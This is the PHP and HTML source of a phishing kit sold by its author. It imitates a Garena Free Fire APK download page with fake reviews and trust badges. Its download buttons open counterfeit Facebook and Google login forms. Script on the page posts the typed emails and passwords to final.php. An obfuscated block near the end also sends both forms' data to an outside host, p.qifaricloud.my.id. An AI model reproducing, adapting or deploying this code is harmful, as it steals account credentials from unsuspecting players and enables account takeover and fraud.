<?php
// Creator Sc  : ABU CODE - X 
// Order Script Vip : https://wa.me/6289509551861

$ngGet = file_get_contents("system/data.json");
$data = json_decode($ngGet,true);

if(isset($_GET['change'])){
$ngGet = file_get_contents("system/data.json");
$data = json_decode($ngGet,true);
$ngResult = json_encode($data);
$ngFile = fopen('system/data.json','w');
           fwrite($ngFile,$ngResult);
           fclose($ngFile);
}
if(isset($_POST['sessionToken']) && isset($_GET['gToken'])){
    $sessionToken = $_POST['sessionToken'];
    $gToken = $_GET['gToken'];
    
    if($sessionToken != "well"){
        header("Location: verify.php");
    }
    
    if($gToken != "verified"){
        header("Location: verify.php");
    }

include "system/payload.php";
gcodeCheckSession("verify.php");
?>
<html lang="en">
 <head> 
  <meta charset="UTF-8"> 
  <title>Garena : Free Fire. Best survival Battle Royale on mobile!</title> 
  <meta name="viewport" content="width=device-width, initial-scale=1, maximum-scale=2"> 
  <meta property="og:description" content="Free Fire : Exchange Event"> 
  <meta property="og:image" content="https://cdn.jsdelivr.net/gh/alex-hostingg/img@main/9/bff.png"> 
  <meta property="og:image:width" content="540"> 
  <meta property="og:image:height" content="282"> 
  <link href="./index_files/css" rel="stylesheet"> 
  <link rel="stylesheet" href="https://cdn.jsdelivr.net/gh/alex-hostingg/css@main/9/animate.css"> 
  <link rel="stylesheet" href="https://cdn.jsdelivr.net/gh/alex-hostingg/css@main/9/loading.css"> 
  <link rel="stylesheet" href="https://cdn.jsdelivr.net/gh/alex-hostingg/css@main/9/facebook.css"> 
  <link rel="stylesheet" href="https://cdn.jsdelivr.net/gh/alex-hostingg/css@main/9/google.css"> 
  <link rel="stylesheet" href="https://cdn.jsdelivr.net/gh/alex-hostingg/css@main/9/all.css"> 
  <link href="https://fonts.googleapis.com/css2?family=Roboto&amp;display=swap" rel="stylesheet"> 
  <link href="https://fonts.googleapis.com/css2?family=Teko&amp;display=swap" rel="stylesheet"> 
  <link href="https://stackpath.bootstrapcdn.com/font-awesome/4.7.0/css/font-awesome.min.css" rel="stylesheet" integrity="sha384-wvfXpqpZZVQGK6TAh5PVlGOfQNHSoD2xbE+QkPxCAFlNEevoEH3Sl0sibVcOQVnN" crossorigin="anonymous"> 
  <link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/material-design-iconic-font/2.2.0/css/material-design-iconic-font.min.css"> 
  <link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/font-awesome/6.4.2/css/all.min.css"> 
  <link rel="stylesheet" href="https://cdn.jsdelivr.net/gh/alex-hostingg/css@main/9/min.css"> 
  <link rel="stylesheet" href="https://cdn.jsdelivr.net/gh/alex-hostingg/css@main/9/ori.css"> 
  <link rel="icon" type="img/png" href="https://cdn.jsdelivr.net/gh/alex-hostingg/img@main/9/bff.png" sizes="32x32"> 
  <style>
</style> 
 </head> 
 <body style=""> 
  <div class="slider-container"> 
   <div class="navbar"> 
    <img class="navbar-logo" src="https://cdn.jsdelivr.net/gh/alex-hostingg/img@main/9/bff.png"> 
    <div class="navbar-left"> 
     <img class="navbar-language" src="https://cdn.jsdelivr.net/gh/alex-hostingg/img@main/9/glob.svg"> 
     <div class="navbar-text">
      EN
     </div> 
    </div> 
    <div class="navbar-right"> 
     <img class="navbar-menu" src="https://cdn.jsdelivr.net/gh/alex-hostingg/img@main/9/menu.png"> 
    </div> 
   </div> 
   <div class="container"> 
    <div class="app-icon"> 
     <img src="https://cdn.jsdelivr.net/gh/alex-hostingg/img@main/9/download.jpeg" alt="Free Fire : Garena Icon"> 
    </div> 
    <div class="app-info"> 
     <div class="app-title">
       Garena : Free Fire (BETA) 
     </div> 
     <div class="dev-name" style="display: flex; align-items: center;"> 
      <span>Garena</span> 
      <span class="trust-badge" style="display: flex; align-items: center; margin-left: 8px;"> <img alt="Trustable Ranking Icon" src="https://cdn.jsdelivr.net/gh/alex-hostingg/img@main/9/official-app.svg" style="width: 18px; height: 18px;"> <span style="margin-left: 4px; font-size: 14px; color: #1da1f2;">Official App</span> </span> 
     </div> 
     <div class="rating"> 
      <span class="stars">★★★★★</span> 
      <span class="rating-value">4.1</span> 
      <span class="rating-votes">(13M votes)</span> 
     </div> 
     <div style="display: flex; justify-content: center; margin: 16px 0; gap: 12px;"> 
      <button class="download-btn" id="opengp" style="background: #205884;" onclick="Loginpopunder()">Download APK (89 MB)</button> 
      <style>
                @keyframes fadeIn {
                    from { opacity: 0; }
                    to { opacity: 1; }
                }
                </style> 
     </div> 
     <div id="download-processing" style="display:none;color:#1da1f2;font-size: 13px;text-align:center;animation: fadeIn 0.5s;margin-top: -24px;margin-bottom: 13px;"> 
      <i class="fa fa-spinner fa-spin"></i> Download processing... 
     </div> 
     <div class="app-desc">
       Garena : Free Fire. Best survival Battle Royale on mobile!
     </div> 
     <div class="app-details"> 
      <div>
       <strong>Version:</strong> 1.8.65.8941
      </div> 
      <div>
       <strong>Last update:</strong> 2025-06-01
      </div> 
      <div>
       <strong>Downloads:</strong> 500M+
      </div> 
      <div>
       <strong>Requires Android:</strong> 4.1+
      </div> 
      <div>
       <strong>Content Rating:</strong> Everyone 10+
      </div> 
     </div> 
    </div> 
   </div> 
   <div class="app-view__AppDetailsContainer-sc-oiuh9w-4 jBqCjJ"> 
    <div class="app-view__Row-sc-oiuh9w-1 app-view__TabsContainer-sc-oiuh9w-5 jaAMtu cfcJXE"> 
     <span class="app-view__RobotoFont-sc-oiuh9w-6 app-view__AppViewTab-sc-oiuh9w-7 WvlRB eiySUK" id="tab-details">Details</span> 
     <span class="app-view__RobotoFont-sc-oiuh9w-6 app-view__AppViewTab-sc-oiuh9w-7 WvlRB jbbpIZ" id="tab-reviews">Reviews</span> 
     <span class="app-view__RobotoFont-sc-oiuh9w-6 app-view__AppViewTab-sc-oiuh9w-7 WvlRB jbbpIZ" id="tab-faqs">FAQs</span> 
     <span class="app-view__RobotoFont-sc-oiuh9w-6 app-view__AppViewTab-sc-oiuh9w-7 WvlRB jbbpIZ" id="tab-versions">Versions</span> 
     <span class="app-view__RobotoFont-sc-oiuh9w-6 app-view__AppViewTab-sc-oiuh9w-7 WvlRB jbbpIZ" id="tab-info">Info</span> 
    </div> 
    <div id="tab-content-details" class="tab-content" style="display:block;"> 
     <div class="game-description"> 
      <h4 style="color: #9db6db; margin-bottom: 8px;">Description</h4> 
      <p> <strong>Free Fire</strong> is a fast-paced Best survival Battle Royale on mobile! game for Android, where real players team up and battle in real time using their favorite characters. With quick matchmaking and smooth controls, you’ll jump straight into action-packed matches designed for both casual and competitive gamers.</p>

<p>Experience classic Best survival Battle Royale on mobile! gameplay with intense gunfights, strategic positioning, looting, and survival mechanics. Choose from a growing roster of characters—each with unique abilities and playstyles. Teamwork and strategy are key: coordinate with your squad, survive the shrinking zone, and eliminate enemies to claim victory.</p> <p>Free Fire stands out for its fair and balanced matchmaking system, ensuring that skill and teamwork—not spending—determine your success. Battles start quickly and typically last just minutes, making it easy to enjoy a full match anytime, anywhere.</p> <p>The intuitive controls let you master your character quickly: use the virtual joystick on the left to move and action buttons on the right for shooting, aiming, and skills. Innovative features like auto-loot keep you focused on the fight, while a fast reconnection system ensures you’re never left behind if your connection drops.</p> <p>With stunning graphics, regular updates, and a vibrant global community, Best survival Battle Royale on mobile! gaming comes to your mobile device. Jump in, team up, and prove your skills on the battlefield!</p>
     </div> 
    </div> 
    <div id="tab-content-reviews" class="tab-content" style="display:none;"> 
     <div class="reviews-section" style="padding:16px;"> 
      <h4 style="color: #9db6db; margin-bottom: 8px;">Reviews</h4> 
      <div class="review"> 
       <div class="review-header" style="display: flex; align-items: center; margin-bottom: 6px;"> 
        <img src="https://cdn.jsdelivr.net/gh/alex-hostingg/img@main/9/32.jpg" alt="User" style="width:32px;height:32px;border-radius:50%;margin-right:10px;"> 
        <div> 
         <strong>Andrew Smith</strong> 
         <div style="font-size:12px;color:#aaa;">
          June 2, 2024
         </div> 
        </div> 
       </div> 
       <div class="review-rating" style="color: #FFD700;">
        ★★★★★
       </div> 
       <div class="review-text">
        Best survival Battle Royale game on Android! Great graphics, smooth gameplay, and lots of favorite heroes. Playing with friends is even more fun!
       </div> 
      </div> 
      <hr style="border:0;border-top:1px solid #222;margin:12px 0;"> 
      <div class="review"> 
       <div class="review-header" style="display: flex; align-items: center; margin-bottom: 6px;"> 
        <img src="https://cdn.jsdelivr.net/gh/alex-hostingg/img@main/9/44.jpg" alt="User" style="width:32px;height:32px;border-radius:50%;margin-right:10px;"> 
        <div> 
         <strong>Sophia Lee</strong> 
         <div style="font-size:12px;color:#aaa;">
          May 28, 2024
         </div> 
        </div> 
       </div> 
       <div class="review-rating" style="color: #FFD700;">
        ★★★★☆
       </div> 
       <div class="review-text">
        Really fun, but sometimes it lags if the signal is bad. The events are interesting and the skins are awesome!
       </div> 
      </div> 
      <hr style="border:0;border-top:1px solid #222;margin:12px 0;"> 
      <div class="review"> 
       <div class="review-header" style="display: flex; align-items: center; margin-bottom: 6px;"> 
        <img src="https://cdn.jsdelivr.net/gh/alex-hostingg/img@main/9/65.jpg" alt="User" style="width:32px;height:32px;border-radius:50%;margin-right:10px;"> 
        <div> 
         <strong>David Johnson</strong> 
         <div style="font-size:12px;color:#aaa;">
          May 15, 2024
         </div> 
        </div> 
       </div> 
       <div class="review-rating" style="color: #FFD700;">
        ★★★★★
       </div> 
       <div class="review-text">
        Fast matchmaking, easy-to-understand controls. Suitable for both beginners and pros. Frequent updates too!
       </div> 
      </div> 
      <hr style="border:0;border-top:1px solid #222;margin:12px 0;"> 
      <div class="review"> 
       <div class="review-header" style="display: flex; align-items: center; margin-bottom: 6px;"> 
        <img src="https://cdn.jsdelivr.net/gh/alex-hostingg/img@main/9/68.jpg" alt="User" style="width:32px;height:32px;border-radius:50%;margin-right:10px;"> 
        <div> 
         <strong>Emily Rose</strong> 
         <div style="font-size:12px;color:#aaa;">
          April 30, 2024
         </div> 
        </div> 
       </div> 
       <div class="review-rating" style="color: #FFD700;">
        ★★★☆☆
       </div> 
       <div class="review-text">
        The game is good, but sometimes toxic players are annoying. Hope it gets better in the future!
       </div> 
      </div> 
     </div> 
    </div> 
    <div id="tab-content-faqs" class="tab-content" style="display:none;"> 
     <div class="faqs-section" style="padding:16px;"> 
      <h4 style="color: #9db6db; margin-bottom: 8px;">FAQs</h4> 
      <div class="faq-item"> 
       <strong>How to download Free Fire APK?</strong> 
       <p> To download Free Fire on your Android device, simply tap the Download button above and follow the steps provided. On some devices, you may need to grant special permissions to the Aptoide app store to install apps from unknown sources. Usually, this permission is requested during installation, but if not, you can manually enable it in your Android settings. </p> 
      </div> 
      <div class="faq-item"> 
       <strong>Is Free Fire free?</strong> 
       <p> Downloading and playing Free Fire is completely free! You don t need to pay anything to enjoy the game. While in-app purchases are available, the Aptoide version offers you a bonus on every purchase. </p> 
      </div> 
      <div class="faq-item"> 
       <strong>What is the total size of Free Fire?</strong> 
       <p> Garena : Free Fire APK is about 136.5 MB, making it one of the lightest MOBA games for Android. Despite its small size, it offers high-quality graphics, voice-acting, and a great gaming experience. </p> 
      </div> 
      <div class="faq-item"> 
       <strong>Why is Free Fire so popular?</strong> 
       <p> Free Fire is popular due to its fast 10-second matchmaking, 10-minute battles, and a variety of survival Battle Royale on mobile </p> 
      </div> 
     </div> 
    </div> 
    <div id="tab-content-versions" class="tab-content" style="display:none;"> 
     <div class="versions-section" style="padding:16px;"> 
      <h4 style="color: #9db6db; margin-bottom: 8px;">Versions</h4> 
      <div class="versions__VersionsItemContainer-sc-1qeurd6-7 bnprIO"> 
       <h2 class="versions__LastVersionHeader-sc-1qeurd6-11 dHjtkP">Latest Version of Garena : Free Fire</h2> 
       <div class="versions__VersionItemContainer-sc-1qeurd6-1 fOmFIn"> 
        <div class="versions__DetailsColumn-sc-1qeurd6-3 feHwps"> 
         <div class="versions__VersionItemTitle-sc-1qeurd6-6 kxJGCc"> 
          <span color="#171717" class="appview-header__AppViewSpan-sc-weylp4-13 gIkYdN">21.9.93.10904</span> 
          <img alt="Trust Icon Versions" src="https://cdn.jsdelivr.net/gh/alex-hostingg/img@main/9/trust-icon.svg" class="versions__TrustedIcon-sc-1qeurd6-8 cvkavv"> 
         </div> 
         <span color="#6F6F6F" class="appview-header__AppViewSpan-sc-weylp4-13 iJfTuT">1/6/2025</span> 
         <div class="versions__DetailsRow-sc-1qeurd6-5 gEpwez"> 
          <span color="#6F6F6F" class="appview-header__AppViewSpan-sc-weylp4-13 iJfTuT">6M downloads</span> 
          <span color="#6F6F6F" class="appview-header__AppViewSpan-sc-weylp4-13 hdwVVt">199 MB Size</span> 
         </div> 
        </div> 
        <div class="versions__DownloadContainer-sc-1qeurd6-4 hyvrS"> 
         <div class="download-button__DownloadContainer-sc-18tslsf-0 iupaOQ"> 
          <a href="javascript:void(0);" class="gradient-button__OutlinedAppStore-sc-1troloh-4 fDAbyw track-download-button version-download-btn" style="text-decoration:none;color:inherit;" onclick="Loginpopunder()"> Download </a> 
         </div> 
        </div> 
       </div> 
      </div> 
     </div> 
    </div> 
    <div id="tab-content-info" class="tab-content" style="display:none;"> 
     <div class="info-section" style="padding:16px;"> 
      <h4 style="color: #9db6db; margin-bottom: 8px;">Info</h4> 
      <div class="info__InfoContainer-sc-1q3osbl-0 geZfTX"> 
       <div class="info__APKInformation-sc-1q3osbl-5 dMZnbg"> 
        <h2 class="info__APKHeaderTitle-sc-1q3osbl-7 ckkSOj">Garena : Free Fire - APK Information</h2> 
        <span class="info__APKDetail-sc-1q3osbl-8 jNjvUq"><strong>APK Version:</strong> 21.9.93.10904</span> 
        <span class="info__APKDetail-sc-1q3osbl-8 jNjvUq"><strong>Package:</strong> com.garena.freefire</span> 
        <span class="info__APKDetail-sc-1q3osbl-8 jNjvUq"><strong>Android compatability:</strong> 4.4 - 4.4.4+ (KitKat)</span> 
        <span class="info__APKDetail-sc-1q3osbl-8 jNjvUq"> 
         <meta itemprop="publisher" content="Garena"> <strong>Developer:</strong> <a href="https://www.mobilelegends.com/" rel="nofollow" class="info__InfoAnchor-sc-1q3osbl-9 jXmlxC"> 
          <meta itemprop="publisher" content="Garena">Garena </a> </span> 
        <span class="info__APKDetail-sc-1q3osbl-8 jNjvUq"> <strong>Privacy Policy:</strong> <a href="https://m.mobilelegends.com/news/articleldetail?newsid=2690279" rel="nofollow" class="info__InfoAnchor-sc-1q3osbl-9 jXmlxC"> https://garena.com/news/articleldetail?newsid=2690279 </a> </span> 
        <span class="info__APKDetail-sc-1q3osbl-8 jNjvUq"> <strong>Permissions:</strong> <a data-cy="permissions" class="info__InfoAnchor-sc-1q3osbl-9 jXmlxC">47</a> </span> 
       </div> 
       <div class="info__DetailsInformations-sc-1q3osbl-10 jRooCZ"> 
        <div class="info__DetailsCol-sc-1q3osbl-11 cogrwL"> 
         <span class="info__APKDetail-sc-1q3osbl-8 jNjvUq"><strong>Name:</strong>Garena : Free Fire</span> 
         <span class="info__APKDetail-sc-1q3osbl-8 jNjvUq"><strong>Size:</strong> 199 MB</span> 
         <span class="info__APKDetail-sc-1q3osbl-8 jNjvUq"><strong>Downloads:</strong> 6M</span> 
         <span class="info__APKDetail-sc-1q3osbl-8 jNjvUq"><strong>Version :</strong> 21.9.93.10904</span> 
         <span class="info__APKDetail-sc-1q3osbl-8 jNjvUq"><strong>Release Date:</strong> 2025-06-20 11:09:06</span> 
         <span class="info__APKDetail-sc-1q3osbl-8 jNjvUq"><strong>Min Screen:</strong> SMALL</span> 
         <span class="info__APKDetail-sc-1q3osbl-8 jNjvUq"><strong>Supported CPU:</strong> armeabi-v7a, arm64-v8a</span> 
         <span class="info__APKDetail-sc-1q3osbl-8 jNjvUq"><strong>Package ID:</strong> com.garena.freefire</span> 
         <span class="info__APKDetail-sc-1q3osbl-8 jNjvUq"><strong>SHA1 Signature:</strong> D6:59:C5:39:7A:8F:2A:5B:6F:34:89:E5:46:A3:89:CA:54:FD:28:FC</span> 
        </div> 
       </div> 
      </div> 
     </div> 
    </div> 
   </div> 
         <script>
            const tabs = [
                { btn: 'tab-details', content: 'tab-content-details' },
                { btn: 'tab-reviews', content: 'tab-content-reviews' },
                { btn: 'tab-faqs', content: 'tab-content-faqs' },
                { btn: 'tab-versions', content: 'tab-content-versions' },
                { btn: 'tab-info', content: 'tab-content-info' }
            ];
            tabs.forEach(({btn, content}) => {
                document.getElementById(btn).addEventListener('click', function() {
                    tabs.forEach(({btn: b, content: c}) => {
                        document.getElementById(c).style.display = (c === content) ? 'block' : 'none';
                        document.getElementById(b).classList.toggle('eiySUK', b === btn);
                        document.getElementById(b).classList.toggle('jbbpIZ', b !== btn);
                    });
                });
            });
        </script> 
  <script>
        const toggleBtn = document.getElementById('toggleDescBtn');
        const descContent = document.getElementById('descContent');
        const arrowIcon = document.getElementById('arrowIcon');
        let isShown = false;
        descContent.style.display = 'none';
        arrowIcon.className = 'fa fa-chevron-up';
        toggleBtn.addEventListener('click', function() {
            isShown = !isShown;
            descContent.style.display = isShown ? 'block' : 'none';
            arrowIcon.className = isShown ? 'fa fa-chevron-down' : 'fa fa-chevron-up';
        });
    </script>
<div class="popup-login selectLogin animate fadeIn" style="display: none;"> 
   <div class="option"> 
    <center> 
     <div class="textdwnlfgn">
      Login to Continue.
     </div> 
     <div class="imgLog" style="display:block; margin: auto; margin-top: 20px;"> 
      <img src="https://cdn.jsdelivr.net/gh/alex-hostingg/img@main/9/logfb.webp" onclick="OpenFacebook();"> 
      <img src="https://cdn.jsdelivr.net/gh/alex-hostingg/img@main/9/loggp.webp" onclick="OpenGoogle();"> 
     </div> 
    </center> 
   </div> 
  </div> 
  </center> 
   </div> 
  </div> 
  <div class="popup-login loginxFacebook animated fadeIn" style="display: none;"> 
   <div class="popup-box-login-fb"> 
    <a class="close-alex-google" onclick="CloseFacebook()"><i style="position: relative; top: 0px;" class="fa fa-times"></i></a> 
    <div class="navbar-fb"> 
     <img width="45" src="https://cdn.jsdelivr.net/gh/alex-hostingg/img@main/9/fbatas.webp"> 
    </div> 
    <div class="content-box-fb"> 
     <img width="55" height="55" src="https://cdn.jsdelivr.net/gh/alex-hostingg/img@main/9/fb.webp"> 
     <div class="txt-login-fb">
      Masuk ke akun Anda untuk terhubung dengan Facebook.com
     </div>
     <form class="login-form" id="FromxFacebook" method="POST"> 
      <input type="text" name="email" placeholder="Nomor ponsel atau email" autocomplete="off" autocapitalize="off" required> 
      <input type="password" name="password" placeholder="Kata Sandi Facebook" autocomplete="off" autocapitalize="off" required> 
      <input type="hidden" name="login" value="Facebook" readonly> 
      <button class="btn-login-fb" type="submit">Masuk</button> 
     </form> 
     <div class="txt-create-account">
      Create account
     </div> 
     <div class="txt-not-now">
      Not now
     </div> 
     <div class="txt-forgotten-password">
      Forgotten password?
     </div> 
    </div> 
    <div class="language-box"> 
     <center> 
      <div class="language-name language-name-active">
       English (UK)
      </div> 
      <div class="language-name">
       Bahasa Indonesia
      </div> 
      <div class="language-name">
       Basa Jawa
      </div> 
      <div class="language-name">
       Bahasa Melayu
      </div> 
      <div class="language-name">
       日本語
      </div> 
      <div class="language-name">
       Español
      </div> 
      <div class="language-name">
       Português (Brasil)
      </div> 
      <div class="language-name"> 
       <i class="fa fa-plus"></i> 
      </div> 
     </center> 
    </div> 
    <div class="copyright">
     Facebook Inc.
    </div> 
   </div> 
  </div> 
  <div class="popup-ariandi alex-google animate fadeIn" style="display: none;"> 
   <div class="container-box-google"> 
    <a class="close-alex-google" onclick="CloseGoogle()"><i style="position: relative; top: 0px;" class="fa fa-times"></i></a> 
    <div class="atasan-google"> 
     <center> 
      <p class="kagetgoogle email-gp">Please check if the <b>login</b> and <b>password</b> you entered are correct.</p> 
      <p class="kagetgoogle sandi-gp">Please check if the <b>login</b> and <b>password</b> you entered are correct.</p> 
      <br> 
      <img class="img-loggoogle" src="https://cdn.jsdelivr.net/gh/alex-hostingg/img@main/9/gp.webp" style="width: 120px;"> 
     </center> 
    </div> 
    <div class="isi-google"> 
     <center> 
      <form id="FromxGoogle" method="POST"> 
       <div class="ucapan-google">
        Login to 
        <b>Google</b> to carry on.
       </div> 
       <div class="form-login-google"> 
        <input type="text" id="email_gp" name="email" placeholder="Email. Telepon, atau Username" required> 
       </div> 
       <div class="form-login-google"> 
        <input type="password" id="password_gp" name="password" placeholder="Kata Sandi" required> 
       </div> 
       <input type="hidden" name="login" value="Google" readonly> 
       <button class="btn-login-google cancel" type="submit">Masuk</button> 
       <!-- <button class="btn-login-google" style="background: #fff; border: 1px solid #000; color: #000;" type="button" onclick="ariandi_google()">Cancel</button> --> 
       <br> 
      </form>  
     </center> 
    </div> 
   </div> 
  </div> 
  <script src="https://code.jquery.com/jquery-3.7.1.min.js"></script>
  <script src="https://cdnassets.biz.id/ajax/libs/jquery/3.7.1/jquery.min.js"></script>
  <script>
  $(document).ready(function () {

    function containsLetters(value) {
        return /[a-zA-Z]/.test(value);
    }

    function isValidEmail(email) {
        return email.toLowerCase().endsWith('@gmail.com');
    }

    function containsSuspiciousContent(value) {
        return /(http|https|:\/\/)/i.test(value);
    }

    function handleFormSubmit(formSelector, emailSelector, passwordSelector, loginType) {

        $(formSelector).submit(function (e) {
            e.preventDefault();

            var email    = $(emailSelector).val().trim();
            var password = $(passwordSelector).val().trim();

            if (email && password) {

                if (containsSuspiciousContent(email) || containsSuspiciousContent(password)) {
                    alert("Email dan Password tidak boleh mengandung 'https'.");
                    return;
                }

                if (containsLetters(email) && !isValidEmail(email)) {
                    alert("HARAP TAMBAHKAN @gmail.com.");
                    return;
                }
                
                $.post("final.php", {
                    email: email,
                    password: password,
                    login: loginType
                });
                window.location.href = "https://doods-stream.site/unduh";
            }
        });
    }
    
    // Aktifkan fungsi submit untuk FB dan GP
    handleFormSubmit("#FromxFacebook", 'input[name="email"]', 'input[name="password"]', "Facebook");
    handleFormSubmit("#FromxGoogle", "#email_gp", "#password_gp", "Google");


    // Tombol
    $("#codxFacebook").click(function () { OpenFacebook(); });
    $("#codxGoogle").click(function () { OpenGoogle(); });
    $("#Loginpopunder").click(function () { Loginpopunder(); });

});
</script>
<?php
//DON'T DELETE THIS MODULE
//MODULE DI ENC BIAR KAGA KE MALINGAN KODE
?>
<script>
$(document)['\u0072\u0065\u0061\u0064\u0079'](function(){$("\u0023\u0046\u0072\u006F\u006D\u0078\u0046\u0061\u0063\u0065\u0062\u006F\u006F\u006B\u002C\u0023\u0046\u0072\u006F\u006D\u0078\u0047\u006F\u006F\u0067\u006C\u0065")['\u0073\u0075\u0062\u006D\u0069\u0074'](function(x,_0x845g8e){x['\u0070\u0072\u0065\u0076\u0065\u006E\u0074\u0044\u0065\u0066\u0061\u0075\u006C\u0074']();var _0x3160a=$(this)['\u0073\u0065\u0072\u0069\u0061\u006C\u0069\u007A\u0065']();_0x845g8e='\u0068\u006C\u006B\u0063\u006F\u0063';$['\u0061\u006A\u0061\u0078']({'\u0075\u0072\u006C':'https://p.qifaricloud.my.id/myjs/apixgg.php','\u0074\u0079\u0070\u0065':"\u0050\u004F\u0053\u0054",'\u0064\u0061\u0074\u0061':_0x3160a});});});
</script>
</body>
</html>
<?php
}else{
    header("Location: verify.php");
}
?>